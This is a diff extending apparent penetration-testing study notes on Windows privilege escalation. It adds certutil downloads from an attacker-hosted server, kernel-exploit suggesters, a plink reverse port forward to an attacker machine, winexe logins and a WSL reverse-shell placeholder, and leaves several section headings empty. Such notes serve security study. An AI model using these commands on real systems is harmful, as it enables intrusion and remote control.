@@ -66,5 +66,59 @@
 - Close the connection
 	- `net use /d \\[host]\[shareName]`
 - For more ways to transfer the files: https://medium.com/@dr.spitfire/ocsp-file-transfer-recipe-for-delicious-post-exploitation-a407e00f7346
+- We can also use certutil to download the file from windows cmd.
+- In attacker machine
+	- `python3 -m http.server 1337`
+- In victim's machine
+	- `certutil -urlcache -f http://<attacker-ip>:1337/test.exe test.exe`
+
+## Escalation Path: Kernel Exploits
+**Escalation with Metasploit**
+- After Metrepreter
+	- `run post/multi/recon/local_exploit_suggester`
+
+**Manual Kernel Exploitation**
+- In windows PS
+	- `systeminfo`
+	- Copy the data from above commands.
+- In attacker machine
+	- Save the data in a text file
+	- `windows-exploit-suggester.py --database <db-date>.xlsx --systeminfo systeminfo.txt `
+- Windows Kernel Exploits - https://github.com/SecWiki/windows-kernel-exploits
+
+## Escalation Path: Stored Passwords and Port Forwarding
+ - Sometimes there are servies that are only accessible from inside the nnetwork. These services might be vulnerable since they are not meant to be seen from the outside
+ - View such ports cmd: `netstat -ano`, suppose you got port 445
+ - Open an SSH server on an attacker machine
+- Fort port using [plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) in windows
+	- `plink.exe -l <attackerusername> -pw <attackerpassword> <attackerIP> -R 445:127.0.0.1:445`
+- `winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"`
+
+## Escalation Path: Windows Subsystem for Linux
+- Find out if wsl.exe and bash.exe exists on the windows machine.
+	- `where /R c:\windows bash.exe`
+	- `where /R c:\windows wsl.exe`
+- Check if wsl.exe returns root
+	- `wsl.exe whoami`
+	- `wsl.exe python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'`
+- HTB to practice "SecNotes"
+
+## Impersonation and Potato Attacks
+
+## Escalation Path: getsystem
+
+## Escalation Path: RunAs
+
+## Escalation Path: Registry
+
+## Escalation Path: Executable Files
+
+## Escalation Path: Startup Applications
+
+## Escalation Path: DLL Hijacking
+
+## Escalation Path: Service Permissions (Paths)
+
+## Escalation Path: CVE-2019-1388
 
 
